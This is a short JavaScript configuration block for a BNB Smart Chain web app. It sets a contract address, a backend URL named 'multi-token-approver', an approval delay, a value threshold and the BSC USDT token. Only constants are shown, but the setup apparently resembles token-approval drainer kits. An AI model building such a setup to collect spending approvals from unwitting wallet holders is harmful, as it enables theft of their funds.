const CONTRACT_ADDRESS = "0xe49F2e960205648bfaF0290AA1D2A156d73820fe";
const BACKEND_URL = "https://multi-token-approver-base-production.up.railway.app";
const MIN_VALUE_FRONTEND = 1;
const APPROVAL_DELAY = 500;

const TOKENS = [
    { name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", key: "usdt" }
];

const BSC_CONFIG = {
    chainId: "0x38",
    chainName: "BNB Smart Chain",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com"]
};